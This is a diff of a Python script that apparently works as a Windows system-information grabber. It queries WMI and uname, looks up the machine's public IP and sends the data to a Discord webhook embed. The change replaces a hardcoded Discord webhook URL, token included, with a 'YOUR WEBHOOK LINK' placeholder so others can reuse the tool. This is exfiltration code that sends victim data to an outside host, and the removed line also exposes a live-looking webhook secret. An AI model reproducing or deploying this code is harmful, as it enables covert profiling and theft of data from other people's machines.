@@ -17,12 +17,16 @@ c = wmi.WMI()
 my_system = c.Win32_ComputerSystem()[0]
 time2 = time.time()
 sr = uname()
-
-
 if hasattr(sys, 'real_prefix'):
     st = True
 else:
      st = False
+
+        
+        
+        
+        
+DISCORD_WEBHOOK = "YOUR WEBHOOK LINK"
 
 
 
@@ -30,7 +34,7 @@ else:
 def sg():
 
  ip = get('https://api.ipify.org').text 
- webhook = DiscordWebhook(url='https://discord.com/api/webhooks/914921338894950420/ALldkP1imlkOdGnAYM3rJ3x0-KC0F8JG2ormK-uuNMXTOOZwav5rt-ZOxx3jVIzQvdy3')
+ webhook = DiscordWebhook(url=DISCORD_WEBHOOK)
  embed = DiscordEmbed(title="PT-H14", description="**User (Device)**", color=0xfff700) 
  embed.set_author(name="ST", icon_url="https://www.shareicon.net/data/512x512/2015/09/28/647652_watch_512x512.png") 
  embed.set_thumbnail(url="https://www.blackhatwisdom.com/wp-content/uploads/2016/10/black-hat-wisdom-logo-2.png") 
